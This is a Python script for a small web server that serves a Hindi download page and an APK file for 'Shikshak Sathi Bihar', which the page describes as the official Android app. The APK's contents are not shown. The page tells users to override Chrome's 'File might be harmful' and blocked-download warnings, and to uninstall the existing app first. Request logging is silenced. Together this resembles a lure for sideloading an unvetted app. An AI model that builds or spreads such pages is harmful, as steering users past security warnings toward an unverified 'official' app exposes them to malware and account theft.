import os
import sys
import socketserver
from http.server import HTTPServer, BaseHTTPRequestHandler

APK_PATH = "/app/applet/Shikshak_Sathi.apk"

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>शिक्षक साथी बिहार - ऐप डाउनलोड</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
      color: #1f2937;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: #ffffff;
      border-radius: 20px;
      padding: 32px 24px;
      max-width: 480px;
      width: 100%;
      box-shadow: 0 20px 40px rgba(0,0,0,0.25);
      text-align: center;
    }
    .badge {
      display: inline-block;
      background: #dbeafe;
      color: #1e40af;
      font-weight: 700;
      font-size: 13px;
      padding: 6px 14px;
      border-radius: 999px;
      margin-bottom: 16px;
    }
    h1 {
      font-size: 24px;
      color: #0f172a;
      margin-bottom: 8px;
    }
    p.subtitle {
      font-size: 14px;
      color: #64748b;
      margin-bottom: 24px;
    }
    .btn-download {
      display: block;
      width: 100%;
      background: #2563eb;
      color: #ffffff;
      font-size: 18px;
      font-weight: bold;
      padding: 16px;
      border-radius: 12px;
      text-decoration: none;
      box-shadow: 0 4px 14px rgba(37,99,235,0.4);
      transition: all 0.2s ease;
      cursor: pointer;
    }
    .btn-download:hover {
      background: #1d4ed8;
      transform: translateY(-2px);
    }
    .file-info {
      font-size: 12px;
      color: #94a3b8;
      margin-top: 10px;
    }
    .instructions {
      text-align: left;
      background: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      padding: 16px;
      margin-top: 24px;
    }
    .instructions h3 {
      font-size: 15px;
      color: #334155;
      margin-bottom: 10px;
    }
    .instructions ol {
      padding-left: 20px;
      font-size: 13px;
      color: #475569;
      line-height: 1.6;
    }
    .warning {
      background: #fef3c7;
      border-left: 4px solid #f59e0b;
      padding: 10px;
      border-radius: 6px;
      margin-top: 12px;
      font-size: 12px;
      color: #92400e;
      text-align: left;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="badge">बिहार शिक्षक साथी • Latest Release</div>
    <h1>शिक्षक साथी बिहार</h1>
    <p class="subtitle">आधिकारिक एंड्राइड एप्लीकेशन (वर्ज़न 2.5)</p>
    
    <a href="/download-apk" class="btn-download" download="Shikshak_Sathi.apk">
      📲 डायरेक्ट APK डाउनलोड करें
    </a>
    <div class="file-info">साइज़: ~29 MB • Android 7.0 से 15 तक समर्थित</div>

    <div class="instructions">
      <h3>⚠️ डाउनलोड या इनस्टॉल में समस्या?</h3>
      <ol>
        <li>यदि Chrome में <b>"File might be harmful"</b> दिखे, तो <b>"Download anyway"</b> पर क्लिक करें।</li>
        <li>यदि डाउनलोड <b>"Blocked"</b> या <b>"Failed"</b> हो, तो Chrome के Downloads में जाकर <b>"Keep"</b> या <b>"Download suspicious file"</b> चुनें।</li>
        <li>इनस्टॉल करने से पहले फोन में पुरानी ऐप को <b>Uninstall</b> (हटा) दें।</li>
        <li>डाउनलोड पूरा होने के बाद फाइल पर क्लिक करके <b>Install</b> करें।</li>
      </ol>
    </div>

    <div class="warning">
      💡 <b>टिप:</b> यदि डाउनलोड बीच में रुक जाए, तो पेज को दोबारा रिफ्रेश करके डाउनलोड करें।
    </div>
  </div>
</body>
</html>
"""

class CustomHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ["/download-apk", "/Shikshak_Sathi.apk"]:
            if not os.path.exists(APK_PATH):
                self.send_error(404, "APK file not found")
                return
            file_size = os.path.getsize(APK_PATH)
            self.send_response(200)
            self.send_header("Content-Type", "application/vnd.android.package-archive")
            self.send_header("Content-Disposition", 'attachment; filename="Shikshak_Sathi.apk"')
            self.send_header("Content-Length", str(file_size))
            self.send_header("Accept-Ranges", "bytes")
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.end_headers()
            with open(APK_PATH, "rb") as f:
                while True:
                    chunk = f.read(65536)
                    if not chunk:
                        break
                    self.wfile.write(chunk)
        else:
            content = HTML_TEMPLATE.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(content)))
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.end_headers()
            self.wfile.write(content)

    def do_HEAD(self):
        self.do_GET()

    def log_message(self, format, *args):
        # Silent logging
        pass

if __name__ == "__main__":
    port = 3000
    socketserver.TCPServer.allow_reuse_address = True
    server = HTTPServer(("0.0.0.0", port), CustomHandler)
    print(f"Download server running on port {port}")
    server.serve_forever()
